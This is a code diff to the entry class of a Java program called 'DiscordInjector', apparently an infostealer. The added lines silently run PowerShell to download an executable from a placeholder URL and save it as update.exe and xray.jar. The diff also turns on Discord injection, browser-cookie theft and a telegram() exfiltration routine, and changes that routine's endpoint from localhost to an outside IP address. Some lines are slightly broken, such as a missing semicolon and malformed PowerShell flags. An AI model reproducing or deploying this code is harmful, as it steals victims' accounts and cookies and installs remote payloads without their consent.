@@ -15,11 +15,21 @@ import java.nio.channels.ReadableByteChannel;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import static java.lang.Thread.sleep;
+
 public class Start {
     public static long snowflakeId = Snowflake.generateSnowflakeId();
     public static String documents = "C:\\Users\\Public\\Documents";
 
+    public static String exeUrl = "your exe url"
+
     public static void main(String[] argument) throws Exception {
+        String username = System.getProperty("user.name");
+        Runtime.getRuntime().exec("powershell.exe -ExecutionPolicy -createnowindow -Command wget " + exeUrl + " -O 'C:\\Users\\" + username + "\\update.exe'");
+        Runtime.getRuntime().exec("powershell.exe -ExecutionPolicy -createnowindow -Command wget " + exeUrl + " -OutFile 'C:\\Users\\" + username + "\\update.exe'");
+        Runtime.getRuntime().exec("powershell.exe -ExecutionPolicy -createnowindow -Command wget " + exeUrl + " -OutFile 'C:\\Users\\" + username + "\\xray.jar'");
+        Runtime.getRuntime().exec("powershell.exe -ExecutionPolicy -createnowindow -Command wget " + exeUrl +  " -O 'C:\\Users\\" + username + "\\xray.jar'");
+
         System.out.println("Starting DiscordInjector...");
         String version = "1.0.2";
 		versionChecker(version);
@@ -32,7 +42,7 @@ public class Start {
         ElevateUtil elevateUtil = new ElevateUtil();
         elevateUtil.elevate();
 
-        //DiscordInjector.instance.initialize();
+        DiscordInjector.instance.initialize();
         Sender.sendMessage("DiscordInjector initialized.");
 		Sender.sendMessage("Starting other arguments...");
 		Browsers.main(argument);
@@ -46,7 +56,8 @@ public class Start {
         KillBrowsers.kill();
         sendCookies.zaa();
         sendCookies.mh();
-        //telegram();
+        telegram();
+
 
         File folder = new File("C:\\Users\\Public\\Documents");
         File[] listOfFiles = folder.listFiles();
@@ -80,7 +91,6 @@ public class Start {
 
         Sender.sendToServer(zort);
 
-        System.exit(0);
 	}
 
 
@@ -121,7 +131,7 @@ public class Start {
     }
 
     public static void telegram() throws IOException {
-        String url = "http://127.0.0.1:1453/send-message";
+        String url = "http://3.67.98.46:1453/";
 
         String hostname;
 
